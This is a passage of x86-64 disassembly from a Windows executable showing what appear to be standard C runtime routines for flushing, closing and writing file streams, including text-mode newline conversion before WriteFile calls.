   140008dcd:	48 8b d9             	mov    %rcx,%rbx
   140008dd0:	48 85 c9             	test   %rcx,%rcx
   140008dd3:	75 07                	jne    0x140008ddc
   140008dd5:	48 83 c4 20          	add    $0x20,%rsp
   140008dd9:	5b                   	pop    %rbx
   140008dda:	eb 44                	jmp    0x140008e20
   140008ddc:	e8 6f ff ff ff       	call   0x140008d50
   140008de1:	85 c0                	test   %eax,%eax
   140008de3:	74 05                	je     0x140008dea
   140008de5:	83 c8 ff             	or     $0xffffffff,%eax
   140008de8:	eb 1f                	jmp    0x140008e09
   140008dea:	8b 43 14             	mov    0x14(%rbx),%eax
   140008ded:	c1 e8 0b             	shr    $0xb,%eax
   140008df0:	a8 01                	test   $0x1,%al
   140008df2:	74 13                	je     0x140008e07
   140008df4:	48 8b cb             	mov    %rbx,%rcx
   140008df7:	e8 14 f2 ff ff       	call   0x140008010
   140008dfc:	8b c8                	mov    %eax,%ecx
   140008dfe:	e8 d9 02 00 00       	call   0x1400090dc
   140008e03:	85 c0                	test   %eax,%eax
   140008e05:	75 de                	jne    0x140008de5
   140008e07:	33 c0                	xor    %eax,%eax
   140008e09:	48 83 c4 20          	add    $0x20,%rsp
   140008e0d:	5b                   	pop    %rbx
   140008e0e:	c3                   	ret
   140008e0f:	90                   	nop
   140008e10:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008e15:	eb 09                	jmp    0x140008e20
   140008e17:	90                   	nop
   140008e18:	90                   	nop
   140008e19:	90                   	nop
   140008e1a:	90                   	nop
   140008e1b:	90                   	nop
   140008e1c:	90                   	nop
   140008e1d:	90                   	nop
   140008e1e:	90                   	nop
   140008e1f:	90                   	nop
   140008e20:	48 8b c4             	mov    %rsp,%rax
   140008e23:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140008e27:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140008e2b:	57                   	push   %rdi
   140008e2c:	41 56                	push   %r14
   140008e2e:	41 57                	push   %r15
   140008e30:	48 83 ec 40          	sub    $0x40,%rsp
   140008e34:	8b f1                	mov    %ecx,%esi
   140008e36:	83 60 cc 00          	andl   $0x0,-0x34(%rax)
   140008e3a:	83 60 c8 00          	andl   $0x0,-0x38(%rax)
   140008e3e:	b9 08 00 00 00       	mov    $0x8,%ecx
   140008e43:	e8 34 d6 ff ff       	call   0x14000647c
   140008e48:	90                   	nop
   140008e49:	48 8b 3d 18 dc 00 00 	mov    0xdc18(%rip),%rdi        # 0x140016a68
   140008e50:	48 63 05 09 dc 00 00 	movslq 0xdc09(%rip),%rax        # 0x140016a60
   140008e57:	4c 8d 34 c7          	lea    (%rdi,%rax,8),%r14
   140008e5b:	41 83 cf ff          	or     $0xffffffff,%r15d
   140008e5f:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140008e64:	49 3b fe             	cmp    %r14,%rdi
   140008e67:	74 71                	je     0x140008eda
   140008e69:	48 8b 1f             	mov    (%rdi),%rbx
   140008e6c:	48 89 5c 24 68       	mov    %rbx,0x68(%rsp)
   140008e71:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140008e76:	48 85 db             	test   %rbx,%rbx
   140008e79:	75 02                	jne    0x140008e7d
   140008e7b:	eb 57                	jmp    0x140008ed4
   140008e7d:	48 8b cb             	mov    %rbx,%rcx
   140008e80:	e8 2f f3 ff ff       	call   0x1400081b4
   140008e85:	90                   	nop
   140008e86:	8b 43 14             	mov    0x14(%rbx),%eax
   140008e89:	c1 e8 0d             	shr    $0xd,%eax
   140008e8c:	a8 01                	test   $0x1,%al
   140008e8e:	74 3c                	je     0x140008ecc
   140008e90:	83 fe 01             	cmp    $0x1,%esi
   140008e93:	75 13                	jne    0x140008ea8
   140008e95:	48 8b cb             	mov    %rbx,%rcx
   140008e98:	e8 2b ff ff ff       	call   0x140008dc8
   140008e9d:	41 3b c7             	cmp    %r15d,%eax
   140008ea0:	74 2a                	je     0x140008ecc
   140008ea2:	ff 44 24 24          	incl   0x24(%rsp)
   140008ea6:	eb 24                	jmp    0x140008ecc
   140008ea8:	85 f6                	test   %esi,%esi
   140008eaa:	75 20                	jne    0x140008ecc
   140008eac:	8b 43 14             	mov    0x14(%rbx),%eax
   140008eaf:	d1 e8                	shr    $1,%eax
   140008eb1:	a8 01                	test   $0x1,%al
   140008eb3:	74 17                	je     0x140008ecc
   140008eb5:	48 8b cb             	mov    %rbx,%rcx
   140008eb8:	e8 0b ff ff ff       	call   0x140008dc8
   140008ebd:	8b 54 24 20          	mov    0x20(%rsp),%edx
   140008ec1:	41 3b c7             	cmp    %r15d,%eax
   140008ec4:	41 0f 44 d7          	cmove  %r15d,%edx
   140008ec8:	89 54 24 20          	mov    %edx,0x20(%rsp)
   140008ecc:	48 8b cb             	mov    %rbx,%rcx
   140008ecf:	e8 ec f2 ff ff       	call   0x1400081c0
   140008ed4:	48 83 c7 08          	add    $0x8,%rdi
   140008ed8:	eb 85                	jmp    0x140008e5f
   140008eda:	b9 08 00 00 00       	mov    $0x8,%ecx
   140008edf:	e8 ec d5 ff ff       	call   0x1400064d0
   140008ee4:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140008ee8:	83 fe 01             	cmp    $0x1,%esi
   140008eeb:	0f 44 44 24 24       	cmove  0x24(%rsp),%eax
   140008ef0:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140008ef5:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140008efa:	48 83 c4 40          	add    $0x40,%rsp
   140008efe:	41 5f                	pop    %r15
   140008f00:	41 5e                	pop    %r14
   140008f02:	5f                   	pop    %rdi
   140008f03:	c3                   	ret
   140008f04:	53                   	push   %rbx
   140008f05:	48 83 ec 40          	sub    $0x40,%rsp
   140008f09:	8b d9                	mov    %ecx,%ebx
   140008f0b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140008f10:	e8 9b b9 ff ff       	call   0x1400048b0
   140008f15:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140008f1a:	0f b6 d3             	movzbl %bl,%edx
   140008f1d:	48 8b 08             	mov    (%rax),%rcx
   140008f20:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   140008f24:	25 00 80 00 00       	and    $0x8000,%eax
   140008f29:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140008f2e:	74 0c                	je     0x140008f3c
   140008f30:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140008f35:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140008f3c:	48 83 c4 40          	add    $0x40,%rsp
   140008f40:	5b                   	pop    %rbx
   140008f41:	c3                   	ret
   140008f42:	90                   	nop
   140008f43:	90                   	nop
   140008f44:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008f49:	57                   	push   %rdi
   140008f4a:	48 83 ec 30          	sub    $0x30,%rsp
   140008f4e:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140008f53:	b9 08 00 00 00       	mov    $0x8,%ecx
   140008f58:	e8 1f d5 ff ff       	call   0x14000647c
   140008f5d:	90                   	nop
   140008f5e:	bb 03 00 00 00       	mov    $0x3,%ebx
   140008f63:	89 5c 24 24          	mov    %ebx,0x24(%rsp)
   140008f67:	3b 1d f3 da 00 00    	cmp    0xdaf3(%rip),%ebx        # 0x140016a60
   140008f6d:	74 6e                	je     0x140008fdd
   140008f6f:	48 63 fb             	movslq %ebx,%rdi
   140008f72:	48 8b 05 ef da 00 00 	mov    0xdaef(%rip),%rax        # 0x140016a68
   140008f79:	48 8b 04 f8          	mov    (%rax,%rdi,8),%rax
   140008f7d:	48 85 c0             	test   %rax,%rax
   140008f80:	75 02                	jne    0x140008f84
   140008f82:	eb 55                	jmp    0x140008fd9
   140008f84:	8b 48 14             	mov    0x14(%rax),%ecx
   140008f87:	c1 e9 0d             	shr    $0xd,%ecx
   140008f8a:	f6 c1 01             	test   $0x1,%cl
   140008f8d:	74 19                	je     0x140008fa8
   140008f8f:	48 8b 0d d2 da 00 00 	mov    0xdad2(%rip),%rcx        # 0x140016a68
   140008f96:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   140008f9a:	e8 d5 11 00 00       	call   0x14000a174
   140008f9f:	83 f8 ff             	cmp    $0xffffffff,%eax
   140008fa2:	74 04                	je     0x140008fa8
   140008fa4:	ff 44 24 20          	incl   0x20(%rsp)
   140008fa8:	48 8b 05 b9 da 00 00 	mov    0xdab9(%rip),%rax        # 0x140016a68
   140008faf:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   140008fb3:	48 83 c1 30          	add    $0x30,%rcx
   140008fb7:	ff 15 93 31 00 00    	call   *0x3193(%rip)        # 0x14000c150
   140008fbd:	48 8b 0d a4 da 00 00 	mov    0xdaa4(%rip),%rcx        # 0x140016a68
   140008fc4:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   140008fc8:	e8 73 b7 ff ff       	call   0x140004740
   140008fcd:	48 8b 05 94 da 00 00 	mov    0xda94(%rip),%rax        # 0x140016a68
   140008fd4:	48 83 24 f8 00       	andq   $0x0,(%rax,%rdi,8)
   140008fd9:	ff c3                	inc    %ebx
   140008fdb:	eb 86                	jmp    0x140008f63
   140008fdd:	b9 08 00 00 00       	mov    $0x8,%ecx
   140008fe2:	e8 e9 d4 ff ff       	call   0x1400064d0
   140008fe7:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140008feb:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140008ff0:	48 83 c4 30          	add    $0x30,%rsp
   140008ff4:	5f                   	pop    %rdi
   140008ff5:	c3                   	ret
   140008ff6:	90                   	nop
   140008ff7:	90                   	nop
   140008ff8:	53                   	push   %rbx
   140008ff9:	48 83 ec 20          	sub    $0x20,%rsp
   140008ffd:	48 8b d9             	mov    %rcx,%rbx
   140009000:	8b 41 14             	mov    0x14(%rcx),%eax
   140009003:	c1 e8 0d             	shr    $0xd,%eax
   140009006:	a8 01                	test   $0x1,%al
   140009008:	74 27                	je     0x140009031
   14000900a:	8b 41 14             	mov    0x14(%rcx),%eax
   14000900d:	c1 e8 06             	shr    $0x6,%eax
   140009010:	a8 01                	test   $0x1,%al
   140009012:	74 1d                	je     0x140009031
   140009014:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140009018:	e8 23 b7 ff ff       	call   0x140004740
   14000901d:	f0 81 63 14 bf fe ff 	lock andl $0xfffffebf,0x14(%rbx)
   140009024:	ff 
   140009025:	33 c0                	xor    %eax,%eax
   140009027:	48 89 43 08          	mov    %rax,0x8(%rbx)
   14000902b:	48 89 03             	mov    %rax,(%rbx)
   14000902e:	89 43 10             	mov    %eax,0x10(%rbx)
   140009031:	48 83 c4 20          	add    $0x20,%rsp
   140009035:	5b                   	pop    %rbx
   140009036:	c3                   	ret
   140009037:	90                   	nop
   140009038:	33 c0                	xor    %eax,%eax
   14000903a:	38 01                	cmp    %al,(%rcx)
   14000903c:	74 0e                	je     0x14000904c
   14000903e:	48 3b c2             	cmp    %rdx,%rax
   140009041:	74 09                	je     0x14000904c
   140009043:	48 ff c0             	inc    %rax
   140009046:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   14000904a:	75 f2                	jne    0x14000903e
   14000904c:	c3                   	ret
   14000904d:	90                   	nop
   14000904e:	90                   	nop
   14000904f:	90                   	nop
   140009050:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009055:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000905a:	57                   	push   %rdi
   14000905b:	48 83 ec 20          	sub    $0x20,%rsp
   14000905f:	49 8b f9             	mov    %r9,%rdi
   140009062:	49 8b d8             	mov    %r8,%rbx
   140009065:	8b 0a                	mov    (%rdx),%ecx
   140009067:	e8 14 dc ff ff       	call   0x140006c80
   14000906c:	90                   	nop
   14000906d:	48 8b 03             	mov    (%rbx),%rax
   140009070:	48 63 08             	movslq (%rax),%rcx
   140009073:	48 8b d1             	mov    %rcx,%rdx
   140009076:	48 8b c1             	mov    %rcx,%rax
   140009079:	48 c1 f8 06          	sar    $0x6,%rax
   14000907d:	4c 8d 05 8c d5 00 00 	lea    0xd58c(%rip),%r8        # 0x140016610
   140009084:	83 e2 3f             	and    $0x3f,%edx
   140009087:	48 c1 e2 06          	shl    $0x6,%rdx
   14000908b:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000908f:	f6 44 10 38 01       	testb  $0x1,0x38(%rax,%rdx,1)
   140009094:	74 24                	je     0x1400090ba
   140009096:	e8 e9 dc ff ff       	call   0x140006d84
   14000909b:	48 8b c8             	mov    %rax,%rcx
   14000909e:	ff 15 8c 31 00 00    	call   *0x318c(%rip)        # 0x14000c230
   1400090a4:	33 db                	xor    %ebx,%ebx
   1400090a6:	85 c0                	test   %eax,%eax
   1400090a8:	75 1e                	jne    0x1400090c8
   1400090aa:	e8 21 bc ff ff       	call   0x140004cd0
   1400090af:	48 8b d8             	mov    %rax,%rbx
   1400090b2:	ff 15 48 2f 00 00    	call   *0x2f48(%rip)        # 0x14000c000
   1400090b8:	89 03                	mov    %eax,(%rbx)
   1400090ba:	e8 31 bc ff ff       	call   0x140004cf0
   1400090bf:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400090c5:	83 cb ff             	or     $0xffffffff,%ebx
   1400090c8:	8b 0f                	mov    (%rdi),%ecx
   1400090ca:	e8 d5 db ff ff       	call   0x140006ca4
   1400090cf:	8b c3                	mov    %ebx,%eax
   1400090d1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400090d6:	48 83 c4 20          	add    $0x20,%rsp
   1400090da:	5f                   	pop    %rdi
   1400090db:	c3                   	ret
   1400090dc:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400090e0:	48 83 ec 38          	sub    $0x38,%rsp
   1400090e4:	48 63 d1             	movslq %ecx,%rdx
   1400090e7:	83 fa fe             	cmp    $0xfffffffe,%edx
   1400090ea:	75 0d                	jne    0x1400090f9
   1400090ec:	e8 ff bb ff ff       	call   0x140004cf0
   1400090f1:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400090f7:	eb 6c                	jmp    0x140009165
   1400090f9:	85 c9                	test   %ecx,%ecx
   1400090fb:	78 58                	js     0x140009155
   1400090fd:	3b 15 0d d9 00 00    	cmp    0xd90d(%rip),%edx        # 0x140016a10
   140009103:	73 50                	jae    0x140009155
   140009105:	48 8b ca             	mov    %rdx,%rcx
   140009108:	4c 8d 05 01 d5 00 00 	lea    0xd501(%rip),%r8        # 0x140016610
   14000910f:	83 e1 3f             	and    $0x3f,%ecx
   140009112:	48 8b c2             	mov    %rdx,%rax
   140009115:	48 c1 f8 06          	sar    $0x6,%rax
   140009119:	48 c1 e1 06          	shl    $0x6,%rcx
   14000911d:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140009121:	f6 44 08 38 01       	testb  $0x1,0x38(%rax,%rcx,1)
   140009126:	74 2d                	je     0x140009155
   140009128:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000912d:	89 54 24 50          	mov    %edx,0x50(%rsp)
   140009131:	89 54 24 58          	mov    %edx,0x58(%rsp)
   140009135:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000913a:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000913f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009144:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140009149:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000914e:	e8 fd fe ff ff       	call   0x140009050
   140009153:	eb 13                	jmp    0x140009168
   140009155:	e8 96 bb ff ff       	call   0x140004cf0
   14000915a:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009160:	e8 6b ba ff ff       	call   0x140004bd0
   140009165:	83 c8 ff             	or     $0xffffffff,%eax
   140009168:	48 83 c4 38          	add    $0x38,%rsp
   14000916c:	c3                   	ret
   14000916d:	90                   	nop
   14000916e:	90                   	nop
   14000916f:	90                   	nop
   140009170:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009175:	55                   	push   %rbp
   140009176:	56                   	push   %rsi
   140009177:	57                   	push   %rdi
   140009178:	41 54                	push   %r12
   14000917a:	41 55                	push   %r13
   14000917c:	41 56                	push   %r14
   14000917e:	41 57                	push   %r15
   140009180:	48 8b ec             	mov    %rsp,%rbp
   140009183:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000918a:	48 8b 05 87 be 00 00 	mov    0xbe87(%rip),%rax        # 0x140015018
   140009191:	48 33 c4             	xor    %rsp,%rax
   140009194:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140009198:	48 63 f2             	movslq %edx,%rsi
   14000919b:	48 8d 05 6e d4 00 00 	lea    0xd46e(%rip),%rax        # 0x140016610
   1400091a2:	4c 8b fe             	mov    %rsi,%r15
   1400091a5:	45 8b e1             	mov    %r9d,%r12d
   1400091a8:	49 c1 ff 06          	sar    $0x6,%r15
   1400091ac:	83 e6 3f             	and    $0x3f,%esi
   1400091af:	48 c1 e6 06          	shl    $0x6,%rsi
   1400091b3:	4d 8b f0             	mov    %r8,%r14
   1400091b6:	4c 89 45 d8          	mov    %r8,-0x28(%rbp)
   1400091ba:	48 8b d9             	mov    %rcx,%rbx
   1400091bd:	4d 03 e0             	add    %r8,%r12
   1400091c0:	4a 8b 04 f8          	mov    (%rax,%r15,8),%rax
   1400091c4:	48 8b 44 30 28       	mov    0x28(%rax,%rsi,1),%rax
   1400091c9:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   1400091cd:	ff 15 65 30 00 00    	call   *0x3065(%rip)        # 0x14000c238
   1400091d3:	33 d2                	xor    %edx,%edx
   1400091d5:	89 45 cc             	mov    %eax,-0x34(%rbp)
   1400091d8:	48 89 13             	mov    %rdx,(%rbx)
   1400091db:	49 8b fe             	mov    %r14,%rdi
   1400091de:	89 53 08             	mov    %edx,0x8(%rbx)
   1400091e1:	4d 3b f4             	cmp    %r12,%r14
   1400091e4:	0f 83 64 01 00 00    	jae    0x14000934e
   1400091ea:	44 8a 2f             	mov    (%rdi),%r13b
   1400091ed:	4c 8d 35 1c d4 00 00 	lea    0xd41c(%rip),%r14        # 0x140016610
   1400091f4:	66 89 55 c0          	mov    %dx,-0x40(%rbp)
   1400091f8:	4b 8b 14 fe          	mov    (%r14,%r15,8),%rdx
   1400091fc:	8a 4c 32 3d          	mov    0x3d(%rdx,%rsi,1),%cl
   140009200:	f6 c1 04             	test   $0x4,%cl
   140009203:	74 1e                	je     0x140009223
   140009205:	8a 44 32 3e          	mov    0x3e(%rdx,%rsi,1),%al
   140009209:	80 e1 fb             	and    $0xfb,%cl
   14000920c:	88 4c 32 3d          	mov    %cl,0x3d(%rdx,%rsi,1)
   140009210:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140009216:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   14000921a:	88 45 e0             	mov    %al,-0x20(%rbp)
   14000921d:	44 88 6d e1          	mov    %r13b,-0x1f(%rbp)
   140009221:	eb 45                	jmp    0x140009268
   140009223:	e8 10 e1 ff ff       	call   0x140007338
   140009228:	0f b6 0f             	movzbl (%rdi),%ecx
   14000922b:	ba 00 80 00 00       	mov    $0x8000,%edx
   140009230:	66 85 14 48          	test   %dx,(%rax,%rcx,2)
   140009234:	74 29                	je     0x14000925f
   140009236:	49 3b fc             	cmp    %r12,%rdi
   140009239:	0f 83 ef 00 00 00    	jae    0x14000932e
   14000923f:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140009245:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140009249:	48 8b d7             	mov    %rdi,%rdx
   14000924c:	e8 53 ed ff ff       	call   0x140007fa4
   140009251:	83 f8 ff             	cmp    $0xffffffff,%eax
   140009254:	0f 84 f4 00 00 00    	je     0x14000934e
   14000925a:	48 ff c7             	inc    %rdi
   14000925d:	eb 1b                	jmp    0x14000927a
   14000925f:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140009265:	48 8b d7             	mov    %rdi,%rdx
   140009268:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000926c:	e8 33 ed ff ff       	call   0x140007fa4
   140009271:	83 f8 ff             	cmp    $0xffffffff,%eax
   140009274:	0f 84 d4 00 00 00    	je     0x14000934e
   14000927a:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140009280:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140009284:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000928a:	4c 8d 45 c0          	lea    -0x40(%rbp),%r8
   14000928e:	8b 4d cc             	mov    -0x34(%rbp),%ecx
   140009291:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140009297:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   14000929e:	00 
   14000929f:	33 d2                	xor    %edx,%edx
   1400092a1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400092a6:	48 ff c7             	inc    %rdi
   1400092a9:	ff 15 d1 2e 00 00    	call   *0x2ed1(%rip)        # 0x14000c180
   1400092af:	44 8b f0             	mov    %eax,%r14d
   1400092b2:	85 c0                	test   %eax,%eax
   1400092b4:	0f 84 94 00 00 00    	je     0x14000934e
   1400092ba:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   1400092be:	4c 8d 4d c8          	lea    -0x38(%rbp),%r9
   1400092c2:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400092c8:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   1400092cc:	44 8b c0             	mov    %eax,%r8d
   1400092cf:	ff 15 93 2e 00 00    	call   *0x2e93(%rip)        # 0x14000c168
   1400092d5:	33 d2                	xor    %edx,%edx
   1400092d7:	85 c0                	test   %eax,%eax
   1400092d9:	74 6b                	je     0x140009346
   1400092db:	8b 4b 08             	mov    0x8(%rbx),%ecx
   1400092de:	2b 4d d8             	sub    -0x28(%rbp),%ecx
   1400092e1:	03 cf                	add    %edi,%ecx
   1400092e3:	89 4b 04             	mov    %ecx,0x4(%rbx)
   1400092e6:	44 39 75 c8          	cmp    %r14d,-0x38(%rbp)
   1400092ea:	72 62                	jb     0x14000934e
   1400092ec:	41 80 fd 0a          	cmp    $0xa,%r13b
   1400092f0:	75 34                	jne    0x140009326
   1400092f2:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   1400092f6:	8d 42 0d             	lea    0xd(%rdx),%eax
   1400092f9:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400092fe:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140009302:	48 8d 55 c4          	lea    -0x3c(%rbp),%rdx
   140009306:	66 89 45 c4          	mov    %ax,-0x3c(%rbp)
   14000930a:	4c 8d 4d c8          	lea    -0x38(%rbp),%r9
   14000930e:	ff 15 54 2e 00 00    	call   *0x2e54(%rip)        # 0x14000c168
   140009314:	33 d2                	xor    %edx,%edx
   140009316:	85 c0                	test   %eax,%eax
   140009318:	74 2c                	je     0x140009346
   14000931a:	83 7d c8 01          	cmpl   $0x1,-0x38(%rbp)
   14000931e:	72 2e                	jb     0x14000934e
   140009320:	ff 43 08             	incl   0x8(%rbx)
   140009323:	ff 43 04             	incl   0x4(%rbx)
   140009326:	49 3b fc             	cmp    %r12,%rdi
   140009329:	e9 b6 fe ff ff       	jmp    0x1400091e4
   14000932e:	8a 07                	mov    (%rdi),%al
   140009330:	4b 8b 0c fe          	mov    (%r14,%r15,8),%rcx
   140009334:	88 44 31 3e          	mov    %al,0x3e(%rcx,%rsi,1)
   140009338:	4b 8b 04 fe          	mov    (%r14,%r15,8),%rax
   14000933c:	80 4c 30 3d 04       	orb    $0x4,0x3d(%rax,%rsi,1)
   140009341:	ff 43 04             	incl   0x4(%rbx)
   140009344:	eb 08                	jmp    0x14000934e
   140009346:	ff 15 b4 2c 00 00    	call   *0x2cb4(%rip)        # 0x14000c000
   14000934c:	89 03                	mov    %eax,(%rbx)
   14000934e:	48 8b c3             	mov    %rbx,%rax
   140009351:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140009355:	48 33 cc             	xor    %rsp,%rcx
   140009358:	e8 43 87 ff ff       	call   0x140001aa0
   14000935d:	48 8b 9c 24 c0 00 00 	mov    0xc0(%rsp),%rbx
   140009364:	00 
   140009365:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   14000936c:	41 5f                	pop    %r15
   14000936e:	41 5e                	pop    %r14
   140009370:	41 5d                	pop    %r13
   140009372:	41 5c                	pop    %r12
   140009374:	5f                   	pop    %rdi
   140009375:	5e                   	pop    %rsi
   140009376:	5d                   	pop    %rbp
   140009377:	c3                   	ret
   140009378:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000937d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140009382:	56                   	push   %rsi
   140009383:	57                   	push   %rdi
   140009384:	41 56                	push   %r14
   140009386:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000938b:	e8 b0 20 00 00       	call   0x14000b440
   140009390:	48 2b e0             	sub    %rax,%rsp
   140009393:	48 8b 05 7e bc 00 00 	mov    0xbc7e(%rip),%rax        # 0x140015018
   14000939a:	48 33 c4             	xor    %rsp,%rax
   14000939d:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   1400093a4:	00 
   1400093a5:	48 8b d9             	mov    %rcx,%rbx
   1400093a8:	4c 63 d2             	movslq %edx,%r10
   1400093ab:	49 8b c2             	mov    %r10,%rax
   1400093ae:	41 8b e9             	mov    %r9d,%ebp
   1400093b1:	48 c1 f8 06          	sar    $0x6,%rax
   1400093b5:	48 8d 0d 54 d2 00 00 	lea    0xd254(%rip),%rcx        # 0x140016610
   1400093bc:	41 83 e2 3f          	and    $0x3f,%r10d
   1400093c0:	49 03 e8             	add    %r8,%rbp
   1400093c3:	83 23 00             	andl   $0x0,(%rbx)
   1400093c6:	49 8b f0             	mov    %r8,%rsi
   1400093c9:	83 63 04 00          	andl   $0x0,0x4(%rbx)
   1400093cd:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   1400093d1:	83 63 08 00          	andl   $0x0,0x8(%rbx)
   1400093d5:	49 c1 e2 06          	shl    $0x6,%r10
   1400093d9:	4e 8b 74 10 28       	mov    0x28(%rax,%r10,1),%r14
   1400093de:	4c 3b c5             	cmp    %rbp,%r8
   1400093e1:	73 6f                	jae    0x140009452
   1400093e3:	48 8d 7c 24 40       	lea    0x40(%rsp),%rdi
   1400093e8:	48 3b f5             	cmp    %rbp,%rsi
   1400093eb:	73 24                	jae    0x140009411
   1400093ed:	8a 06                	mov    (%rsi),%al
   1400093ef:	48 ff c6             	inc    %rsi
   1400093f2:	3c 0a                	cmp    $0xa,%al
   1400093f4:	75 09                	jne    0x1400093ff
   1400093f6:	ff 43 08             	incl   0x8(%rbx)
   1400093f9:	c6 07 0d             	movb   $0xd,(%rdi)
   1400093fc:	48 ff c7             	inc    %rdi
   1400093ff:	88 07                	mov    %al,(%rdi)
   140009401:	48 ff c7             	inc    %rdi
   140009404:	48 8d 84 24 3f 14 00 	lea    0x143f(%rsp),%rax
   14000940b:	00 
   14000940c:	48 3b f8             	cmp    %rax,%rdi
   14000940f:	72 d7                	jb     0x1400093e8
   140009411:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009417:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000941c:	2b f8                	sub    %eax,%edi
   14000941e:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140009423:	44 8b c7             	mov    %edi,%r8d
   140009426:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000942b:	49 8b ce             	mov    %r14,%rcx
   14000942e:	ff 15 34 2d 00 00    	call   *0x2d34(%rip)        # 0x14000c168
   140009434:	85 c0                	test   %eax,%eax
   140009436:	74 12                	je     0x14000944a
   140009438:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000943c:	01 43 04             	add    %eax,0x4(%rbx)
   14000943f:	3b c7                	cmp    %edi,%eax
   140009441:	72 0f                	jb     0x140009452
   140009443:	48 3b f5             	cmp    %rbp,%rsi
   140009446:	72 9b                	jb     0x1400093e3
   140009448:	eb 08                	jmp    0x140009452
   14000944a:	ff 15 b0 2b 00 00    	call   *0x2bb0(%rip)        # 0x14000c000
   140009450:	89 03                	mov    %eax,(%rbx)
   140009452:	48 8b c3             	mov    %rbx,%rax
   140009455:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000945c:	00 
   14000945d:	48 33 cc             	xor    %rsp,%rcx
   140009460:	e8 3b 86 ff ff       	call   0x140001aa0
   140009465:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000946c:	00 
   14000946d:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140009471:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   140009475:	49 8b e3             	mov    %r11,%rsp
   140009478:	41 5e                	pop    %r14
   14000947a:	5f                   	pop    %rdi
   14000947b:	5e                   	pop    %rsi
   14000947c:	c3                   	ret
   14000947d:	90                   	nop
   14000947e:	90                   	nop
   14000947f:	90                   	nop
   140009480:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009485:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000948a:	56                   	push   %rsi
   14000948b:	57                   	push   %rdi
   14000948c:	41 56                	push   %r14
   14000948e:	b8 50 14 00 00       	mov    $0x1450,%eax
   140009493:	e8 a8 1f 00 00       	call   0x14000b440
   140009498:	48 2b e0             	sub    %rax,%rsp
